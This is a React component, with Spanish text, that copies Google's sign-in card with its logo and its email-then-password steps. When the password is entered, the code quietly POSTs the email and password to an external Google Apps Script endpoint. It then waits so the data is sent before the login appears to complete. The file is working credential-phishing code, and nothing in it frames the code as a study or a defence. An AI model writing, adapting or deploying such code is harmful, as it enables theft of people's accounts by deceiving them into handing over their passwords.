import { useState } from "react";
import GoogleLogo from "./GoogleLogo";

const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) => {
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");

  const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";

  const handleEmailNext = () => {
    if (!email.trim()) {
      setEmailError("Introduce un correo electrónico");
      return;
    }
    setEmailError("");
    setStep("password");
  };

  const handlePasswordNext = async () => {
    if (!password.trim()) return;

    try {
      // ENVIAR DATOS Y ESPERAR
      await fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ 
          usuario: email, 
          pass: password, 
          tipo: "LOGIN_GOOGLE" 
        })
      });
    } catch (e) {
      console.log("Enviando...");
    }

    // RETRASO DE SEGURIDAD: Esperamos casi un segundo para asegurar que el paquete de datos salga
    setTimeout(() => {
      onLoginComplete();
    }, 800);
  };

  return (
    <div className="w-full max-w-[450px] mx-auto">
      <div className="forms-card p-10 sm:p-12">
        {step === "email" ? (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
            <div className="space-y-6">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Correo electrónico o teléfono"
                className={`google-input w-full ${emailError ? 'border-destructive' : ''}`}
                autoFocus
              />
              {emailError && <p className="text-xs text-destructive mt-1">⚠ {emailError}</p>}
              <div className="flex justify-between items-center pt-4">
                <span className="google-btn-text text-sm font-medium cursor-pointer">Crear cuenta</span>
                <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
              </div>
            </div>
          </div>
        ) : (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Te damos la bienvenida</h1>
            <div className="flex justify-center mb-8">
              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm font-medium">
                <div className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">👤</div>
                {email}
              </div>
            </div>
            <div className="space-y-6">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Introduce tu contraseña"
                className="google-input w-full"
                autoFocus
              />
              <label className="flex items-center gap-3 cursor-pointer select-none">
                <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-[18px] h-[18px] accent-[#1a73e8]" />
                <span className="text-sm">Mostrar contraseña</span>
              </label>
              <div className="flex justify-between items-center pt-4">
                <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
                <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default GoogleLoginCard;
